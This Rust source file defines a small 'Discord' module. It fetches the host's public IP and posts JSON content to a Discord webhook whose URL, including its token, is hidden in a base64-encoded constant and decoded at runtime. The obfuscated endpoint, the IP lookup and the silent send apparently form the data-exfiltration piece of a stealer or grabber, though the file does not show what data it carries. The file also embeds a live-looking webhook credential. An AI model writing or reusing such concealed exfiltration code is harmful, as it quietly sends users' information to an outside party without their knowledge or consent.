use std::collections::HashMap;

use reqwest::blocking::Client;
use base64::prelude::*;

const DSC: &'static str = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0MDc0Nzc2ODc3OTc2Nzg0OS8xZUtldE4zTzZtSXo4WWcyWVFkbGt5YTRfaGEtVWRsUElxcDVtMzFvaHhGMnlrSEJwYldybWRzTlZtUW9od0lfdXlvRA==";


pub struct Discord {
    data: HashMap<String, String>,
    client: Client,
}

impl Discord {
    pub fn new() -> Discord {
        Discord {
            data: HashMap::new(),
            client: Client::new(),
        }
    }

    pub fn set_username(&mut self, username: &str) {
        self.data.insert(String::from("username"), username.to_string());
    }

    pub fn get_ip(&self) -> String {
        self.client.get("https://api.ipify.org")
            .send()
            .map(|response| response.text().unwrap_or_default())
            .unwrap_or_default()
    }

    pub fn send(&mut self, content: String) {
        self.data.insert(String::from("content"), content);

        let url = String::from_utf8(BASE64_STANDARD.decode(DSC.as_bytes()).expect("internal error")).expect("internal error");

        let _ = self.client.post(url)
            .json(&self.data)
            .send();
    }
}


